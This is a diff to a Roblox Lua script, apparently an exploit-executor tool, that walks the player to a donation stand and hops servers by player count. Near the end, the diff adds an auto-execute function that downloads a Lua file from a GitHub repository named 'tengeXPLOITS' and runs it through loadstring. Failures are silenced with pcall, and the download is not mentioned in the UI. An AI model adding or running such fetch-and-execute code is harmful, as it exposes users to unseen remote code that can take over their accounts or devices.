@@ -2,13 +2,18 @@ local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local TeleportService = game:GetService("TeleportService")
 local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
 
 local PLACE_ID = 81567840903186
-local TARGET_MIN = 39
-local TARGET_MAX = 42
+local TARGET_MIN = 1
+local TARGET_MAX = 37
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
+
+if playerGui:FindFirstChild("DonationStandUI") then
+    return
+end
 
 local gui = Instance.new("ScreenGui")
 gui.Name = "DonationStandUI"
@@ -129,7 +134,7 @@ local targetLabel = Instance.new("TextLabel")
 targetLabel.Size = UDim2.new(1, 0, 0, 20)
 targetLabel.Position = UDim2.new(0, 0, 0, 154)
 targetLabel.BackgroundTransparency = 1
-targetLabel.Text = "Target server size: 39-42 players"
+targetLabel.Text = "Avoid servers above 37 players"
 targetLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
 targetLabel.TextSize = 12
 targetLabel.Font = Enum.Font.Gotham
@@ -234,10 +239,11 @@ local function walkToOwnedStand()
 
     local character = player.Character
     if not character then
-        character = player.CharacterAdded:Wait()
+        player.CharacterAdded:Wait()
+        character = player.Character
     end
 
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
     if not humanoid then
         statusLabel.Text = "No humanoid found."
         return
@@ -273,11 +279,21 @@ local function queueHop()
 
     statusLabel.Text = string.format("Hopping server from %d players...", currentCount)
     saveState()
-    TeleportService:Teleport(PLACE_ID, player, {
-        autoWalk = state.autoWalk,
-        autoHop = state.autoHop,
-        hopTimer = state.hopTimer,
-    })
+
+    local success, err = pcall(function()
+        TeleportService:TeleportAsync(PLACE_ID, { player }, {
+            ShouldReserveServer = true,
+            ReservedServerAccessCode = nil,
+        })
+    end)
+
+    if not success then
+        TeleportService:Teleport(PLACE_ID, player, {
+            autoWalk = state.autoWalk,
+            autoHop = state.autoHop,
+            hopTimer = state.hopTimer,
+        })
+    end
 end
 
 local function startHopLoop()
@@ -357,14 +373,37 @@ end)
 loadState()
 applyStateToUI()
 
+local function autoExecuteScript()
+    local ok, err = pcall(function()
+        local success, result = pcall(function()
+            return loadstring(game:HttpGet("https://raw.githubusercontent.com/tengeXPLOITS/TengeOnTOP/refs/heads/main/dono%20c.lua"))()
+        end)
+        if not success then
+            warn("Donation script load failed:", result)
+        end
+    end)
+
+    if not ok then
+        warn("Donation auto-exec failed:", err)
+    end
+end
+
 player.CharacterAdded:Connect(function()
     task.wait(0.2)
     walkToOwnedStand()
 end)
 
 task.spawn(function()
-    task.wait(0.2)
+    task.wait(0.1)
     walkToOwnedStand()
+    task.wait(0.5)
+    walkToOwnedStand()
+end)
+
+task.spawn(function()
+    if RunService:IsClient() then
+        autoExecuteScript()
+    end
 end)
 
 task.spawn(startHopLoop)
